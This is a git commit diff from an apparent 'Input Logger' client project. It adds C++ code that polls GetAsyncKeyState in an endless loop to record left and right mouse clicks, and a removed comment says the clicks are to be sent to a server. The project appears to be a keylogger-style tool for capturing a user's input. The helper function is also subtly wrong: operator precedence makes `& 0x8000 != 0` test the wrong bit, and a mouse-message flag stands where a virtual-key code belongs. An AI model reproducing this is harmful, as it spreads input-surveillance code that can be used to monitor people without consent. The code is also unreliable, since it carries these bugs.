ddcbf74ce4dba7b32f0bd4c85ac1a516a3e7bcbd
Yahel972 <yahelbareket@gmail.com>
2022-12-03 18:29:04 +0200

    Added left-click & right click recording

--- Client/Input Logger/Input Logger/MouseLogger.cpp
+++ Client/Input Logger/Input Logger/MouseLogger.cpp
@@ -4,14 +4,24 @@ MouseLogger::MouseLogger() {}
 
 MouseLogger::~MouseLogger() {}
 
+// helper function - returns if a specific key has been pressed
+int keyPressed(int key) {
+	return (GetAsyncKeyState(key) & 0x8000 != 0);
+}
+
 // function listens to all mouse clicks & position changes. Will be used as a thread
 void MouseLogger::recordMouseClicks()
 {
 	while (true)
 	{
-		// TODO: spot mouse clicks
-
-		// TODO: send those clicks to the server - use locks
+		if (keyPressed(MK_LBUTTON))
+		{
+			std::cout << "<left-click>";
+		}
+		else if (keyPressed(VK_RBUTTON))
+		{
+			std::cout << "<right-click>";
+		}
 	}
 }
 
